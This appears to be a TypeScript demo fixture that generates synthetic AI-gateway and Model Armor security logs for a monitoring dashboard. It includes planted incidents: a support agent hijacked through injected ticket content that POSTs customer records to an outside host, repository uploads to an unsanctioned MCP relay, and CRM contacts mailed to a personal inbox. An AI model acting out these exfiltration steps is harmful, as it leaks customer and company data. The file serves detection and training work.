// Demo Model Armor prompt logs: a deterministic, seeded stand-in for the Cloud Logging sink that
// receives `modelarmor.googleapis.com` sanitize operations, joined with the AI gateway's agent
// context (principal, app, session, tool / MCP / skill calls). Swapping in a real Logging client
// later only changes this file.
//
// Benign enterprise traffic fills ~30 days. Planted threads are ordinary people asking AI apps, in
// plain language, for things policy forbids (exporting customer lists to a personal inbox, using an
// unapproved MCP server, pasting card numbers...). Flagged third-party content is never stored
// verbatim: like a production log policy, the body is withheld and only the verdict is kept.
// Sensitive values appear as SDP de-identification tokens such as [CREDIT_CARD_NUMBER].

export type ContentRole = "user_prompt" | "model_response" | "tool_result" | "retrieved_context";
export type Confidence = "LOW_AND_ABOVE" | "MEDIUM_AND_ABOVE" | "HIGH";
export type Likelihood = "POSSIBLE" | "LIKELY" | "VERY_LIKELY";
export type FilterKey = "pi_jailbreak" | "sdp" | "malicious_uris" | "rai";
export type RaiType = "harassment" | "hate_speech" | "dangerous" | "sexually_explicit";

export type ToolCall = {
  kind: "mcp" | "skill" | "function";
  server?: string; // MCP server id
  name: string;
  args: string;
  destination?: string; // network destination for outbound calls
  bytes?: number;
};

export type SdpFinding = { infoType: string; likelihood: Likelihood; count: number };

export type PromptLog = {
  insertId: string;
  timestamp: string;
  severity: "INFO" | "WARNING";
  operation: "SANITIZE_USER_PROMPT" | "SANITIZE_MODEL_RESPONSE";
  contentRole: ContentRole;
  template: string;
  enforcement: "INSPECT_AND_BLOCK" | "INSPECT_ONLY";
  filterMatchState: "MATCH_FOUND" | "NO_MATCH_FOUND";
  blocked: boolean;
  filters: {
    pi_jailbreak?: { confidence: Confidence };
    sdp?: { findings: SdpFinding[] };
    malicious_uris?: { uris: string[] };
    rai?: { categories: { type: RaiType; confidence: Confidence }[] };
  };
  principal: string;
  dept: string;
  app: string;
  model: string;
  client: string;
  sessionId: string;
  turn: number;
  sourceIp: string;
  geo: string;
  content: string;
  toolCalls?: ToolCall[];
  latencyMs: number;
};

// ---------------------------------------------------------------- policy registry

export const PROJECT = "acme-ai-prod";
export const ORG_DOMAIN = "acmecorp.com";

export const TEMPLATES = {
  "ma-enterprise-strict": { enforcement: "INSPECT_AND_BLOCK", pi: "MEDIUM_AND_ABOVE", sdp: "advanced: de-identify, block on PCI / SSN / credentials / restricted projects", rai: "MEDIUM_AND_ABOVE", uris: "on" },
  "ma-agent-pilot": { enforcement: "INSPECT_ONLY", pi: "MEDIUM_AND_ABOVE", sdp: "basic", rai: "HIGH", uris: "on" },
  "ma-public-chat": { enforcement: "INSPECT_AND_BLOCK", pi: "LOW_AND_ABOVE", sdp: "advanced", rai: "LOW_AND_ABOVE", uris: "on" },
} as const;
export type TemplateId = keyof typeof TEMPLATES;

export type AppPolicy = {
  name: string;
  owner: string;
  audience: "internal" | "external" | "autonomous";
  template: TemplateId;
  model: string;
  client: string;
  mcpAllow: string[];
  skillAllow: string[];
};

export const APPS: Record<string, AppPolicy> = {
  "workspace-copilot": { name: "Workspace Copilot", owner: "it-productivity", audience: "internal", template: "ma-enterprise-strict", model: "gemini-2.5-pro", client: "web", mcpAllow: ["google-drive", "confluence", "jira", "slack"], skillAllow: ["summarize", "translate", "draft_email", "xlsx", "pdf"] },
  "code-assist": { name: "Code Assist (Claude Code)", owner: "platform-eng", audience: "internal", template: "ma-agent-pilot", model: "claude-sonnet-4-5", client: "claude-code", mcpAllow: ["github-enterprise", "jira", "confluence", "bigquery-analytics"], skillAllow: ["code_search", "run_tests", "open_pull_request", "lint"] },
  "support-agent": { name: "Support Triage Agent", owner: "cx-automation", audience: "autonomous", template: "ma-agent-pilot", model: "gemini-2.5-flash", client: "agent-runtime", mcpAllow: ["zendesk", "confluence", "salesforce"], skillAllow: ["classify_ticket", "draft_reply", "kb_search"] },
  "fin-analyst-agent": { name: "Finance Analyst Agent", owner: "fp-and-a", audience: "internal", template: "ma-enterprise-strict", model: "gemini-2.5-pro", client: "web", mcpAllow: ["bigquery-finance", "google-drive"], skillAllow: ["run_sql", "xlsx", "chart"] },
  "hr-helpdesk-bot": { name: "HR Helpdesk", owner: "people-ops", audience: "internal", template: "ma-enterprise-strict", model: "gemini-2.5-flash", client: "slack", mcpAllow: ["workday", "confluence"], skillAllow: ["policy_lookup", "draft_reply"] },
  "sales-email-agent": { name: "Sales Email Agent", owner: "revops", audience: "internal", template: "ma-enterprise-strict", model: "claude-sonnet-4-5", client: "web", mcpAllow: ["salesforce", "gmail"], skillAllow: ["draft_email", "send_email"] },
  "doc-summarizer": { name: "Drive Doc Summarizer", owner: "it-productivity", audience: "internal", template: "ma-enterprise-strict", model: "gemini-2.5-flash", client: "web", mcpAllow: ["google-drive"], skillAllow: ["summarize"] },
  "browser-research-agent": { name: "Research Browser Agent", owner: "it-productivity", audience: "internal", template: "ma-agent-pilot", model: "gemini-2.5-pro", client: "web", mcpAllow: ["web-fetch"], skillAllow: ["web_search", "summarize"] },
  "help-center-bot": { name: "Help Center Chatbot", owner: "cx-automation", audience: "external", template: "ma-public-chat", model: "gemini-2.5-flash", client: "chat-widget", mcpAllow: [], skillAllow: ["kb_search", "order_lookup"] },
  unregistered: { name: "Unregistered traffic (AI gateway)", owner: "none", audience: "internal", template: "ma-enterprise-strict", model: "unknown", client: "api", mcpAllow: [], skillAllow: [] },
};

export const SANCTIONED_MCP: Record<string, string> = {
  "github-enterprise": "github.acmecorp.com", jira: "acmecorp.atlassian.net", confluence: "acmecorp.atlassian.net", slack: "slack.com",
  "google-drive": "googleapis.com", "bigquery-analytics": "bigquery.googleapis.com", "bigquery-finance": "bigquery.googleapis.com",
  zendesk: "acmecorp.zendesk.com", salesforce: "acmecorp.my.salesforce.com", gmail: "gmail.googleapis.com", workday: "wd5.myworkday.com", "web-fetch": "egress-proxy.acmecorp.com",
};
export const APPROVED_MODELS = ["gemini-2.5-pro", "gemini-2.5-flash", "claude-sonnet-4-5", "claude-haiku-4-5"];
export const PERSONAL_EMAIL_DOMAINS = ["gmail.com", "outlook.com", "yahoo.com", "proton.me", "icloud.com"];

type User = { email: string; dept: string; ip: string; geo?: string };
const U = (name: string, dept: string, ip: string, geo = "US"): User => ({ email: `${name}@${ORG_DOMAIN}`, dept, ip, geo });

export const USERS: User[] = [
  U("d.kowalski", "engineering", "10.20.14.31"), U("r.vasquez", "engineering", "10.20.14.77"), U("p.sharma", "engineering", "10.20.15.12"),
  U("t.okonkwo", "engineering", "10.20.15.40"), U("m.lindqvist", "engineering", "10.20.16.8", "SE"), U("a.ferreira", "engineering", "10.20.16.53"),
  U("j.park", "engineering", "10.20.17.19"), U("s.ibrahim", "engineering", "10.20.17.66"),
  U("t.brennan", "finance", "10.21.3.14"), U("e.castillo", "finance", "10.21.3.29"), U("h.yamamoto", "finance", "10.21.4.2"), U("n.oduya", "finance", "10.21.4.51"),
  U("c.delacroix", "hr", "10.22.1.17"), U("b.mensah", "hr", "10.22.1.44"),
  U("l.hartmann", "legal", "10.23.2.9"), U("f.rossi", "legal", "10.23.2.38", "IT"),
  U("k.moreau", "sales", "10.24.6.21"), U("g.alvarez", "sales", "10.24.6.70"), U("w.chen", "sales", "10.24.7.5"), U("o.nakamura", "sales", "10.24.7.88"),
  U("i.petrov", "support", "10.25.9.12"), U("z.adeyemi", "support", "10.25.9.47"), U("y.tanaka", "support", "10.25.10.3"),
  U("v.sinclair", "executive", "10.26.0.4"), U("n.kaur", "security", "10.27.0.15"),
  U("j.whitfield", "sales-ops (contractor)", "10.24.8.140"), U("x.dumont", "engineering (contractor)", "10.20.30.211", "FR"),
];
const SA = (agent: string): User => ({ email: `${agent}@${PROJECT}.iam.gserviceaccount.com`, dept: "service-account", ip: "10.40.0.12" });
const userBy = (name: string) => USERS.find((u) => u.email.startsWith(`${name}@`))!;

// ---------------------------------------------------------------- seeded helpers

function hashString(s: string): number {
  let h = 2166136261;
  for (let i = 0; i < s.length; i++) h = Math.imul(h ^ s.charCodeAt(i), 16777619);
  return h >>> 0;
}
function rng(seed: number) {
  let a = seed;
  return () => {
    a |= 0; a = (a + 0x6d2b79f5) | 0;
    let t = Math.imul(a ^ (a >>> 15), 1 | a);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}
const pick = <T,>(r: () => number, xs: readonly T[]) => xs[Math.floor(r() * xs.length)];
const hex = (r: () => number, n: number) => Array.from({ length: n }, () => Math.floor(r() * 16).toString(16)).join("");

// ---------------------------------------------------------------- builder

type Draft = {
  ts: number; user: User; app: string; session: string; turn: number; role: ContentRole; content: string;
  filters?: PromptLog["filters"]; tools?: ToolCall[]; blocked?: boolean; model?: string; client?: string;
};

function build(d: Draft, r: () => number): PromptLog {
  const policy = APPS[d.app];
  const enforcement = TEMPLATES[policy.template].enforcement;
  const filters = d.filters ?? {};
  const match = Object.keys(filters).length > 0;
  return {
    insertId: hex(r, 16),
    timestamp: new Date(d.ts).toISOString(),
    severity: match ? "WARNING" : "INFO",
    operation: d.role === "model_response" ? "SANITIZE_MODEL_RESPONSE" : "SANITIZE_USER_PROMPT",
    contentRole: d.role,
    template: `projects/${PROJECT}/locations/us-central1/templates/${policy.template}`,
    enforcement,
    filterMatchState: match ? "MATCH_FOUND" : "NO_MATCH_FOUND",
    blocked: d.blocked ?? (match && enforcement === "INSPECT_AND_BLOCK"),
    filters,
    principal: d.user.email,
    dept: d.user.dept,
    app: d.app,
    model: d.model ?? policy.model,
    client: d.client ?? policy.client,
    sessionId: d.session,
    turn: d.turn,
    sourceIp: d.user.ip,
    geo: d.user.geo ?? "US",
    content: d.content,
    toolCalls: d.tools,
    latencyMs: 40 + Math.floor(r() * 180),
  };
}

// ---------------------------------------------------------------- benign traffic

const BENIGN: Record<string, { prompts: string[]; responses: string[]; tool?: (r: () => number) => ToolCall }> = {
  "workspace-copilot": {
    prompts: [
      "Summarize the Q3 all-hands notes in five bullets", "Draft a polite reply declining the vendor demo next week",
      "Translate this onboarding paragraph into Spanish", "What's our PTO carryover policy?", "Turn these meeting notes into action items with owners",
      "Rewrite this paragraph to sound less formal", "Create an agenda for a 30 minute project kickoff", "Summarize the Jira epic PLAT-2231 and list open blockers",
      "Find the Confluence page about the expense approval workflow", "Write a Slack announcement for the office move on Friday",
      "Compare these two vendor proposals and list the trade-offs", "Make a checklist for closing out the sprint",
    ],
    responses: [
      "Here's a five-bullet summary of the all-hands notes.", "Sure, here's a draft reply.", "Here are the action items with owners.",
      "According to the People Policies page, up to 5 unused PTO days carry over to the next year.", "Here's a suggested agenda.", "I found the page 'Expense approvals: how it works' in the Finance space.",
    ],
    tool: () => ({ kind: "mcp", server: "confluence", name: "search_pages", args: '{"query":"expense approval workflow","limit":5}' }),
  },
  "code-assist": {
    prompts: [
      "Add input validation to the createInvoice handler", "Why is the payments-service test suite flaky on CI?", "Refactor this React component to use a reducer",
      "Write unit tests for the date parsing util", "Explain what this regex does", "Open a PR that bumps axios to 1.7.9 and fixes the type errors",
      "Find where we construct the Pub/Sub client and add retry settings", "Convert this callback-based function to async/await",
      "Why does npm run build fail with TS2345 in src/billing/tax.ts?", "Generate a migration that adds an index on orders.customer_id",
    ],
    responses: [
      "I added a zod schema for the request body and return 400 on validation errors.", "The flakiness comes from a shared fixture that isn't reset between tests.",
      "Here's the refactor using useReducer.", "I've opened PR #4821 with the dependency bump and type fixes.", "The tests pass locally (42 passed).",
    ],
    tool: () => ({ kind: "mcp", server: "github-enterprise", name: "search_code", args: '{"repo":"acme/payments-service","query":"new PubSub("}' }),
  },
  "support-agent": {
    prompts: [],
    responses: ["Classified ticket as billing/refund (confidence 0.91). Drafted reply using KB-1183.", "Classified ticket as how-to/integrations. Drafted reply linking the API quickstart.", "Classified ticket as account/SSO. Escalated to tier 2 with a summary."],
    tool: (r) => ({ kind: "mcp", server: "zendesk", name: "get_ticket", args: `{"id":${47000 + Math.floor(r() * 1200)}}` }),
  },
  "fin-analyst-agent": {
    prompts: [
      "What was opex by department last quarter?", "Chart monthly revenue vs plan for FY26", "Which cost centers are over budget by more than 10%?",
      "Build an xlsx with headcount by region", "Explain the variance in cloud spend between August and September",
    ],
    responses: ["Opex by department for Q3 FY26 is below.", "Three cost centers are over budget by more than 10%.", "Cloud spend rose 14% month over month, mainly from BigQuery slot commitments."],
    tool: () => ({ kind: "mcp", server: "bigquery-finance", name: "run_query", args: '{"sql":"SELECT dept, SUM(amount) FROM finance.opex WHERE quarter=\'FY26Q3\' GROUP BY dept"}' }),
  },
  "hr-helpdesk-bot": {
    prompts: ["How many sick days do I have left?", "How do I update my direct deposit?", "What's the parental leave policy?", "When is open enrollment?", "Who is my HR business partner?"],
    responses: ["You can update direct deposit in Workday under Pay > Payment Elections.", "Open enrollment runs Nov 3 to Nov 17.", "Our parental leave policy provides 16 weeks of paid leave."],
    tool: () => ({ kind: "mcp", server: "confluence", name: "search_pages", args: '{"space":"PEOPLE","query":"parental leave"}' }),
  },
  "sales-email-agent": {
    prompts: ["Draft a follow-up to Brightwave after yesterday's demo", "Write a renewal reminder for Contoso, 60 days out", "Summarize the last three emails with Fabrikam's procurement team"],
    responses: ["Here's a follow-up draft for Brightwave.", "Here's the renewal reminder.", "Summary of the Fabrikam thread is below."],
    tool: () => ({ kind: "mcp", server: "salesforce", name: "get_opportunity", args: '{"account":"Brightwave","stage":"Demo"}' }),
  },
  "doc-summarizer": {
    prompts: ["Summarize the 2026 security awareness training deck", "Give me the key dates in the office relocation plan", "TL;DR of the vendor risk policy"],
    responses: ["The deck covers phishing, MFA fatigue and reporting. Key takeaways are below.", "Key dates: lease signing Nov 1, move weekend Dec 13-14."],
    tool: () => ({ kind: "mcp", server: "google-drive", name: "get_file", args: '{"fileId":"1QxV9a","mimeType":"application/vnd.google-apps.presentation"}' }),
  },
  "browser-research-agent": {
    prompts: ["Find the latest Terraform Google provider release notes", "Research SOC 2 Type II vs ISO 27001 for a 500-person company", "Summarize recent analyst commentary on AI governance programs"],
    responses: ["The latest google provider release adds several new resources; highlights below.", "Here's a comparison table of SOC 2 Type II vs ISO 27001."],
    tool: () => ({ kind: "mcp", server: "web-fetch", name: "fetch_url", args: '{"url":"https://registry.terraform.io/providers/hashicorp/google/latest"}', destination: "registry.terraform.io" }),
  },
  "help-center-bot": {
    prompts: ["How do I reset my password?", "Where is my order?", "Can I change my billing date?", "Do you ship to Canada?", "How do I cancel my subscription?"],
    responses: ["You can reset your password from the sign-in page by choosing 'Forgot password'.", "Yes, we ship to Canada. Delivery takes 5-8 business days.", "You can change your billing date under Account > Billing."],
  },
};

const ALL_USERS = USERS.map((u) => u.email.split("@")[0]);
const APP_USERS: Record<string, string[]> = {
  "workspace-copilot": ALL_USERS,
  "code-assist": ["d.kowalski", "r.vasquez", "p.sharma", "t.okonkwo", "m.lindqvist", "a.ferreira", "j.park", "s.ibrahim", "x.dumont"],
  "fin-analyst-agent": ["t.brennan", "e.castillo", "h.yamamoto", "n.oduya", "v.sinclair"],
  "hr-helpdesk-bot": ALL_USERS,
  "sales-email-agent": ["k.moreau", "g.alvarez", "w.chen", "o.nakamura", "j.whitfield"],
  "doc-summarizer": ALL_USERS,
  "browser-research-agent": ["h.yamamoto", "p.sharma", "l.hartmann", "v.sinclair", "j.park", "n.kaur"],
};
const APP_WEIGHTS: [string, number][] = [
  ["workspace-copilot", 30], ["code-assist", 22], ["support-agent", 12], ["fin-analyst-agent", 6], ["hr-helpdesk-bot", 8],
  ["sales-email-agent", 6], ["doc-summarizer", 7], ["browser-research-agent", 4], ["help-center-bot", 9],
];

function weightedApp(r: () => number) {
  const total = APP_WEIGHTS.reduce((a, [, w]) => a + w, 0);
  let x = r() * total;
  for (const [app, w] of APP_WEIGHTS) if ((x -= w) < 0) return app;
  return APP_WEIGHTS[0][0];
}

function benign(anchor: number, r: () => number): Draft[] {
  const out: Draft[] = [];
  for (let day = 29; day >= 0; day--) {
    const dayStart = Math.floor(anchor / 86_400_000) * 86_400_000 - day * 86_400_000;
    const dow = new Date(dayStart).getUTCDay();
    const sessions = dow === 0 || dow === 6 ? 10 + Math.floor(r() * 6) : 40 + Math.floor(r() * 16);
    for (let s = 0; s < sessions; s++) {
      const app = weightedApp(r);
      const spec = BENIGN[app];
      let ts = dayStart + (8 + r() * 11) * 3_600_000; // business hours, UTC
      if (ts > anchor - 120_000) continue;
      const session = `ses-${hex(r, 8)}`;
      const user: User = app === "support-agent" ? SA("support-agent")
        : app === "help-center-bot" ? { email: `visitor-${hex(r, 6)}@help-center`, dept: "external", ip: `73.${Math.floor(r() * 255)}.${Math.floor(r() * 255)}.${1 + Math.floor(r() * 250)}` }
        : userBy(pick(r, APP_USERS[app]));

      if (app === "support-agent") {
        out.push({ ts, user, app, session, turn: 1, role: "tool_result", tools: [spec.tool!(r)],
          content: `Ticket from ${pick(r, ["brightwave.io", "contoso-retail.com", "fabrikam.co", "northwind-foods.com"])} customer: "${pick(r, ["I was charged twice this month.", "How do I connect the Slack integration?", "Our SSO login stopped working after the update.", "Can you send last month's invoice again?"])}"` });
        out.push({ ts: ts + 3000, user, app, session, turn: 1, role: "model_response", content: pick(r, spec.responses) });
        continue;
      }
      const turns = 1 + Math.floor(r() * 3);
      for (let t = 1; t <= turns; t++) {
        out.push({ ts, user, app, session, turn: t, role: "user_prompt", content: pick(r, spec.prompts) });
        if (spec.tool && r() < 0.45) out.push({ ts: ts + 1500, user, app, session, turn: t, role: "tool_result", content: "Tool returned 5 result(s).", tools: [spec.tool(r)] });
        out.push({ ts: ts + 4000 + Math.floor(r() * 4000), user, app, session, turn: t, role: "model_response", content: pick(r, spec.responses) });
        ts += 60_000 + r() * 400_000;
      }
    }
  }
  return out;
}

// ---------------------------------------------------------------- planted threads

type Step = [offsetSec: number, role: ContentRole, content: string, extra?: Partial<Draft>];

const sdp = (...f: [string, Likelihood, number][]): PromptLog["filters"] => ({ sdp: { findings: f.map(([infoType, likelihood, count]) => ({ infoType, likelihood, count })) } });
const pi = (confidence: Confidence): PromptLog["filters"] => ({ pi_jailbreak: { confidence } });
const WITHHELD = (what: string) => `[content withheld by log policy: ${what}]`;
const REFUSAL = "This request was blocked by your organization's AI usage policy. If you think this is a mistake, contact the IT service desk.";

function planted(anchor: number): Draft[] {
  const out: Draft[] = [];
  const day0 = Math.floor(anchor / 86_400_000) * 86_400_000;
  // at(daysAgo, hh, mm): a wall-clock UTC time on a past day; never later than the anchor.
  const at = (daysAgo: number, hh: number, mm = 0) => Math.min(anchor - 15 * 60_000, day0 - daysAgo * 86_400_000 + (hh * 60 + mm) * 60_000);
  const add = (start: number, base: { user: User; app: string; session: string; model?: string; client?: string }, steps: Step[]) => {
    let turn = 0;
    for (const [offset, role, content, extra] of steps) {
      if (role === "user_prompt" || turn === 0) turn++;
      out.push({ ...base, ts: start + offset * 1000, turn, role, content, ...extra });
    }
  };

  // Every planted record below is metadata only. Where a filter matched, the body is not retained
  // (log policy), so the evidence is the verdict, the counts and the tool/destination context.

  // --- A. Autonomous support agent hijacked through ticket content it retrieved.
  // The pilot template is INSPECT_ONLY, so the injection verdict was recorded and nothing stopped.
  const supportSa = SA("support-agent");
  for (const [days, hh, session, bytes, tickets] of [[6, 2, "ses-4e1b7c90", 48_211, 50], [3, 3, "ses-9c02d5a1", 61_904, 50], [1, 4, "ses-b7f31e02", 57_330, 50]] as const) {
    add(at(days, hh, 14), { user: supportSa, app: "support-agent", session }, [
      [0, "tool_result", WITHHELD("indirect prompt injection in retrieved ticket body"), { filters: pi("HIGH"), tools: [{ kind: "mcp", server: "zendesk", name: "get_ticket", args: '{"id":48213}' }] }],
      [6, "tool_result", `Bulk ticket read returned ${tickets} records.`, { filters: sdp(["EMAIL_ADDRESS", "VERY_LIKELY", tickets], ["PHONE_NUMBER", "VERY_LIKELY", 47]), tools: [{ kind: "mcp", server: "zendesk", name: "search_tickets", args: '{"sort":"created_at desc","limit":50}' }] }],
      [11, "model_response", WITHHELD("customer records staged for outbound transfer"), { filters: sdp(["EMAIL_ADDRESS", "VERY_LIKELY", tickets], ["PHONE_NUMBER", "VERY_LIKELY", 47]), tools: [{ kind: "function", name: "http_request", args: '{"method":"POST","url":"https://ticket-sync.cc/api/v2/ingest"}', destination: "ticket-sync.cc (45.137.21.9)", bytes }] }],
      [15, "model_response", "Replied to the customer with invoice export troubleshooting steps."],
    ]);
  }

  // --- B. Shadow MCP server on the coding agent, used by a contractor over several days.
  const dumont = userBy("x.dumont");
  for (const [days, hh, bytes] of [[9, 19, 2_140_000], [8, 20, 3_880_000], [5, 21, 7_220_000], [2, 22, 11_450_000]] as const) {
    add(at(days, hh, 5), { user: dumont, app: "code-assist", session: `ses-${hex(rng(hashString(`dumont${days}`)), 8)}` }, [
      [0, "user_prompt", "Asked the agent to run the repository through an external analysis service."],
      [8, "tool_result", "Repository tree and source files read.", { tools: [{ kind: "mcp", server: "code-interpreter-cloud", name: "upload_workspace", args: '{"include":["src/**","infra/**"]}', destination: "mcp-relay.dev-tools.io", bytes }] }],
      [20, "model_response", "Analysis returned from the external service; summary rendered to the user."],
    ]);
  }

  // --- C. Credentials and keys pasted into prompts. Strict apps blocked; the pilot app did not.
  for (const [name, days, hh, app, infoType, count] of [
    ["r.vasquez", 11, 10, "workspace-copilot", "GCP_SERVICE_ACCOUNT_KEY", 1],
    ["p.sharma", 7, 15, "code-assist", "GCP_API_KEY", 2],
    ["t.okonkwo", 4, 11, "code-assist", "GCP_SERVICE_ACCOUNT_KEY", 1],
    ["a.ferreira", 2, 16, "workspace-copilot", "PASSWORD", 3],
    ["j.park", 1, 9, "code-assist", "PRIVATE_KEY_PEM", 1],
  ] as const) {
    const blocked = TEMPLATES[APPS[app].template].enforcement === "INSPECT_AND_BLOCK";
    add(at(days, hh, 22), { user: userBy(name), app, session: `ses-${hex(rng(hashString(name + days)), 8)}` }, [
      [0, "user_prompt", WITHHELD(`${infoType} detected in prompt`), { filters: sdp([infoType, "VERY_LIKELY", count]) }],
      [3, "model_response", blocked ? REFUSAL : "Explained the authentication error and suggested rotating the key."],
    ]);
  }

  // --- D. Payment card data in prompts: an internal app (blocked) and the public chatbot (blocked).
  add(at(8, 14, 10), { user: userBy("i.petrov"), app: "workspace-copilot", session: "ses-c41a77b3" }, [
    [0, "user_prompt", WITHHELD("CREDIT_CARD_NUMBER detected in prompt"), { filters: sdp(["CREDIT_CARD_NUMBER", "VERY_LIKELY", 3], ["PERSON_NAME", "LIKELY", 3]) }],
    [3, "model_response", REFUSAL],
  ]);
  add(at(2, 13, 41), { user: { email: "visitor-7d1c04@help-center", dept: "external", ip: "98.44.12.207" }, app: "help-center-bot", session: "ses-2f8ab501" }, [
    [0, "user_prompt", WITHHELD("CREDIT_CARD_NUMBER detected in prompt"), { filters: sdp(["CREDIT_CARD_NUMBER", "VERY_LIKELY", 1]) }],
    [3, "model_response", REFUSAL],
  ]);

  // --- E. Restricted payroll dataset reached through the finance agent.
  add(at(5, 16, 8), { user: userBy("h.yamamoto"), app: "fin-analyst-agent", session: "ses-6b0d92fa" }, [
    [0, "user_prompt", "Requested a per-person compensation breakdown for a cost-centre review."],
    [6, "tool_result", "Query returned 1,284 rows from finance.payroll_detail (restricted dataset).", { filters: sdp(["US_SOCIAL_SECURITY_NUMBER", "VERY_LIKELY", 1284], ["PERSON_NAME", "VERY_LIKELY", 1284]), tools: [{ kind: "mcp", server: "bigquery-finance", name: "run_query", args: '{"sql":"SELECT * FROM finance.payroll_detail"}' }] }],
    [12, "model_response", REFUSAL, { filters: sdp(["US_SOCIAL_SECURITY_NUMBER", "VERY_LIKELY", 1284]) }],
  ]);

  // --- F. Departing contractor: bulk CRM reads, then an outbound mail to a personal address.
  const whitfield = userBy("j.whitfield");
  for (const [days, hh, rows, bytes] of [[12, 20, 4_210, 1_040_000], [10, 21, 6_880, 1_720_000], [4, 22, 11_400, 3_210_000]] as const) {
    add(at(days, hh, 33), { user: whitfield, app: "sales-email-agent", session: `ses-${hex(rng(hashString(`whit${days}`)), 8)}` }, [
      [0, "user_prompt", "Asked for the full customer contact list to be compiled and mailed out."],
      [9, "tool_result", `CRM export returned ${rows} contact records.`, { filters: sdp(["EMAIL_ADDRESS", "VERY_LIKELY", rows], ["PHONE_NUMBER", "LIKELY", Math.round(rows * 0.8)], ["PERSON_NAME", "VERY_LIKELY", rows]), tools: [{ kind: "mcp", server: "salesforce", name: "query_contacts", args: '{"limit":20000,"fields":["name","email","phone","account"]}' }] }],
      [18, "model_response", WITHHELD("contact records staged for outbound mail"), { filters: sdp(["EMAIL_ADDRESS", "VERY_LIKELY", rows]), tools: [{ kind: "skill", name: "send_email", args: '{"to":"j.whitfield.work@gmail.com","attachments":["contacts.csv"]}', destination: "gmail.com (personal address)", bytes }] }],
    ]);
  }

  // --- G. Shadow AI: traffic through the gateway with no registered app and an unapproved model.
  for (const [name, days, hh, model] of [
    ["s.ibrahim", 13, 12, "gpt-4o-mini"], ["m.lindqvist", 9, 14, "llama-3.1-70b-local"],
    ["s.ibrahim", 6, 11, "gpt-4o-mini"], ["g.alvarez", 3, 17, "mistral-large-2411"], ["s.ibrahim", 1, 13, "gpt-4o-mini"],
  ] as const) {
    add(at(days, hh, 50), { user: userBy(name), app: "unregistered", session: `ses-${hex(rng(hashString(name + model + days)), 8)}`, model, client: "api" }, [
      [0, "user_prompt", "Internal document content submitted to an unregistered model endpoint.", { filters: sdp(["INTERNAL_PROJECT_CODENAME", "LIKELY", 2]) }],
      [4, "model_response", "Response returned to the caller."],
    ]);
  }

  // --- H. Research agent reached a URL the filter flagged. Pilot template: recorded, not blocked.
  for (const [name, days, hh, uri] of [["p.sharma", 7, 13, "hxxps://sdk-updates[.]tooling-cdn[.]cc/install"], ["j.park", 2, 15, "hxxps://docs-mirror[.]fast-reader[.]top/view"]] as const) {
    add(at(days, hh, 27), { user: userBy(name), app: "browser-research-agent", session: `ses-${hex(rng(hashString(name + days + "uri")), 8)}` }, [
      [0, "user_prompt", "Asked the agent to open a third-party documentation link."],
      [5, "tool_result", WITHHELD("page body from a flagged URL"), { filters: { malicious_uris: { uris: [uri] } }, tools: [{ kind: "mcp", server: "web-fetch", name: "fetch_url", args: `{"url":"${uri}"}`, destination: uri.replace(/^hxxps:\/\/([^/]+).*$/, "$1").replace(/\[\.\]/g, "."), bytes: 184_000 }] }],
      [12, "model_response", "Summarised the page for the user."],
    ]);
  }

  // --- I. Repeat attempts to talk one app out of its policy, escalating across a single session.
  add(at(4, 15, 2), { user: userBy("o.nakamura"), app: "workspace-copilot", session: "ses-d55e1a74" }, [
    [0, "user_prompt", WITHHELD("policy-evasion attempt, turn 1"), { filters: pi("MEDIUM_AND_ABOVE") }],
    [4, "model_response", REFUSAL],
    [90, "user_prompt", WITHHELD("policy-evasion attempt, turn 2"), { filters: pi("MEDIUM_AND_ABOVE") }],
    [94, "model_response", REFUSAL],
    [210, "user_prompt", WITHHELD("policy-evasion attempt, turn 3"), { filters: pi("HIGH") }],
    [214, "model_response", REFUSAL],
    [360, "user_prompt", WITHHELD("policy-evasion attempt, turn 4"), { filters: pi("HIGH") }],
    [364, "model_response", REFUSAL],
  ]);

  // --- J. Burst of attempts against the public chatbot from one source address.
  for (let i = 0; i < 14; i++) {
    const r = rng(hashString(`burst${i}`));
    add(at(2, 1, 5 + i * 3), { user: { email: `visitor-${hex(r, 6)}@help-center`, dept: "external", ip: "185.220.101.33", geo: "DE (Tor exit)" }, app: "help-center-bot", session: `ses-${hex(r, 8)}` }, [
      [0, "user_prompt", WITHHELD("jailbreak attempt against the public chatbot"), { filters: pi(i % 3 === 0 ? "HIGH" : "MEDIUM_AND_ABOVE") }],
      [2, "model_response", REFUSAL],
    ]);
  }

  // --- K. Responsible-AI verdicts on internal use.
  for (const [name, days, hh, type, confidence] of [
    ["w.chen", 10, 16, "harassment", "MEDIUM_AND_ABOVE"], ["b.mensah", 6, 11, "harassment", "HIGH"], ["g.alvarez", 3, 14, "dangerous", "MEDIUM_AND_ABOVE"],
  ] as const) {
    add(at(days, hh, 36), { user: userBy(name), app: "workspace-copilot", session: `ses-${hex(rng(hashString(name + "rai" + days)), 8)}` }, [
      [0, "user_prompt", WITHHELD(`responsible-AI verdict: ${type}`), { filters: { rai: { categories: [{ type: type as RaiType, confidence: confidence as Confidence }] } } }],
      [3, "model_response", REFUSAL],
    ]);
  }

  // --- L. Unapproved skill invoked by the coding agent (shell execution is not in its allowlist).
  for (const [days, hh] of [[8, 18], [3, 19]] as const) {
    add(at(days, hh, 44), { user: userBy("d.kowalski"), app: "code-assist", session: `ses-${hex(rng(hashString(`shell${days}`)), 8)}` }, [
      [0, "user_prompt", "Asked the agent to resolve a dependency failure in the local checkout."],
      [7, "tool_result", "Skill invoked outside the application's approved skill set.", { tools: [{ kind: "skill", name: "shell_exec", args: '{"cmd":"<redacted>","cwd":"/workspace"}' }] }],
      [16, "model_response", "Reported the dependency resolution result."],
    ]);
  }

  // --- M. Off-hours autonomous volume: the agent runtime working a queue at 03:00 UTC.
  for (let i = 0; i < 22; i++) {
    const r = rng(hashString(`offhours${i}`));
    add(at(1, 3, i * 2), { user: supportSa, app: "support-agent", session: `ses-${hex(r, 8)}` }, [
      [0, "tool_result", "Ticket retrieved from the overnight queue.", { tools: [{ kind: "mcp", server: "zendesk", name: "get_ticket", args: `{"id":${48400 + i}}` }] }],
      [4, "model_response", "Classified and drafted a reply."],
    ]);
  }

  return out;
}

// ---------------------------------------------------------------- assembly

export const ANCHOR = Date.UTC(2026, 9, 15, 17, 30); // fixed "now" so the demo is reproducible

let cache: PromptLog[] | null = null;

export function allLogs(): PromptLog[] {
  if (cache) return cache;
  const r = rng(hashString("model-armor-demo-v1"));
  const drafts = [...benign(ANCHOR, r), ...planted(ANCHOR)];
  cache = drafts
